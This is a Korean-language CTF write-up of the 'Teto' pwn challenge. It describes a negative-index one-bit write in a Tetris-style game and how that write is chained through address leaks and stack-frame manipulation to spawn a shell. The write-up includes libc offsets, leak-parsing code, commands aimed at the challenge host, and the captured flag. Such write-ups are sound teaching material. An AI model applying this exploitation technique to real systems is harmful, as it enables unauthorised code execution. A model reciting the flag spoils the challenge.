---
title: "Teto"
ctf: "BlackHat MEA Qualification CTF 2026"
date: 2026-09-06
category: pwn
difficulty: hard
points: "미공개"
flag_format: "BHFlagY{...}"
author: "팀 공동 풀이"
challenge_author: "Flagyard"
---

# Teto

## Summary

`set_cell()`이 `y == -1`인 셀을 허용하면서 음수 인덱스를 계산하는 것이 핵심 취약점이다. 천장 압력 상태에서 세로 I 블록의 entry kick을 유도하면 `Game.stage` 기준 임의 위치에 **한 비트를 OR로 세우는 primitive**를 얻는다. 이를 이용해 너비를 변조하고 PIE/libc/스택 주소를 누출한 뒤, 여러 게임에 걸쳐 스택 프레임을 조작해 `posix_spawn("/bin/sh", ...)` 경로로 진입했다.

최종 원격 익스플로잇은 팀 공동 풀이 결과를 바탕으로 재현 가능한 형태로 정리했으며, 통합 Windows venv에서도 원격 실행할 수 있도록 glibc 난수열 생성기를 순수 Python으로 구현했다.

## Solution

### Step 1: 음수 인덱스 one-bit OR write

`Game`에서 `stage` 바로 앞에는 `score`, `height`, `width`가 있다.

```c
typedef struct {
    uint32_t score;
    uint16_t height;
    uint16_t width;
    uint8_t stage[STAGE_BYTES];
} Game;
```

문제의 `set_cell()`은 `y < -1`만 거부한다. 정상 보드의 행 크기인 `ROW_BYTES == 2`를 사용하므로 `y == -1`이면 다음 쓰기가 발생한다.

```c
int idx = y * ROW_BYTES + (x >> 3);
g->stage[idx] |= 1u << (x & 7);

// y == -1
g->stage[-2 + (x >> 3)] |= 1u << (x & 7);
```

보드에 60칸 이상 쌓이면 `top_pressure()`가 활성화된다. 이때 생성 직후 `y == -2`인 I 블록을 세로로 회전하면 특별한 `{0, -2}` kick으로 `y == -4`에 고정된다. 세로 I 블록의 맨 아래 셀만 `y == -1`이 되어 위 식을 통과한다. 따라서 수평 위치 `x`를 조절해 원하는 오프셋의 원하는 0 비트를 1로 바꿀 수 있다. 쓰기는 OR 연산이므로 이미 1인 비트를 0으로 되돌릴 수는 없다.

먼저 초기 너비 10의 비트를 차례로 세워 `width = 74`, 이어서 `width = 90`으로 만든다. 렌더러의 `get_cell()`은 변조된 너비에서 계산한 동적 stride를 사용하지만 실제 `stage`는 행당 2바이트뿐이다. 너비 90에서는 stride가 12바이트가 되어 렌더링 결과에 `Game` 뒤쪽 스택 데이터가 섞인다. 첫 9개 렌더 행에서 다음 값을 복구한다.

```python
main_ret     = partial_qword(leak_rows, 0x60)
pie_ret      = partial_qword(leak_rows, 0x40)
call_main_rbp = partial_qword(leak_rows, 0x58)

libc  = main_ret - 0x2A1CA
pie   = pie_ret  - 0x2E69
stage = call_main_rbp - 0xF8
```

### Step 2: 여러 게임에 걸친 제어 흐름 구성

블록 순서는 시드가 고정된 glibc `rand()`이므로 완전히 결정적이다. 익스플로잇은 미리 계산한 배치 계획을 재생하며 매 게임마다 다음 다섯 비트를 세워 반환 주소를 `libc + 0x12bdce`로 바꾼다. 이 주소는 게임을 다시 시작할 수 있는 프레임으로 이어져, 같은 프로세스와 같은 스택에서 쓰기를 누적하게 한다.

23개의 표준 라운드 동안 `stage + 0x150`의 0으로 채워진 슬롯에 `libc + 0x583ec`를 비트 단위로 만든다. 마지막 width-14 라운드에서는 아래 세 값을 동시에 완성한다.

- `stage + 0x60`: 다음 게임 재시작 주소 `libc + 0x12bdce`
- `stage + 0x100`: 시작 프레임 반환 주소를 `libc + 0x17a28f` epilogue로 변경
- `stage + 0x120`: `rbx`가 PIE 내부의 0으로 채워진 영역을 가리키도록 변경

최종 epilogue는 준비한 `libc + 0x583ec`로 반환한다. 이 지점은 만족된 레지스터/메모리 조건에서 `posix_spawn("/bin/sh", ...)` 경로를 실행한다. Full RELRO, canary, NX, PIE뿐 아니라 IBT/SHSTK도 켜져 있으므로, 임의 코드를 주입하는 대신 libc 내부의 유효한 제어 흐름과 기존 스택 프레임을 재사용한다.

약 218 KiB에 달하는 25게임 분량 입력은 한 번에 전송하되 별도 스레드에서 출력을 동시에 비운다. 이는 소켓 버퍼 교착과 짧은 jail 제한 시간을 피하기 위한 조치다. ASLR 비트가 OR-only 변환에 맞지 않으면 연결을 닫고 새 인스턴스로 재시도한다.

### Step 3: 재현

검증 환경은 Python 3.12.10, pwntools 4.15.0, Ubuntu glibc 2.39였다. 저장소 루트의 통합 venv에서 아래처럼 실행한다.

```powershell
.\.venv\Scripts\python.exe .\pwn\Teto\exploit.py HOST=tcp.flagyard.com PORT=14121 CONNECTIONS=12
```

`pwn/Teto/exploit.py`는 독립 실행 코드인 `pwn/Teto/solver/solve.py`를 호출하는 기준 진입점이다. 포트가 교체되면 `PORT` 값만 바꾸면 된다. Linux/WSL에서는 다음 명령도 동일하다.

```bash
.venv/bin/python pwn/Teto/exploit.py HOST=tcp.flagyard.com PORT=14121 CONNECTIONS=12
```

기준 진입점 전체 코드는 다음과 같다.

```python
#!/usr/bin/env python3
"""Canonical launcher for the verified Teto exploit."""

from pathlib import Path
import runpy
import sys


SOLUTION = Path(__file__).resolve().parent / "solver"
ENTRYPOINT = SOLUTION / "solve.py"

if not ENTRYPOINT.is_file():
    raise SystemExit(f"missing teammate solution: {ENTRYPOINT}")

sys.path.insert(0, str(SOLUTION))
runpy.run_path(str(ENTRYPOINT), run_name="__main__")
```

동봉한 ELF를 WSL에서 TCP로 노출한 뒤 같은 Windows 통합 venv로 실행한 검증 결과는 다음과 같다. 일반 로컬 ASLR에서는 호환되는 OR-only 레이아웃이 나올 때까지 재접속했으며, 18번째 연결에서 성공했다.

```text
[+] attempt 18: libc=0x782be965e000 pie=0x60d8c643a000 ... target=27/33
[*] sending 218,253 bytes for 25 batched games
[*] remote output=9,002 bytes, game_overs=24, send_error=None
REMOTE_PWNED
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
BHFlagY{6c890129abf30a3d6fb7d2b7bdb9606e}
```

## Flag

```text
BHFlagY{6c890129abf30a3d6fb7d2b7bdb9606e}
```
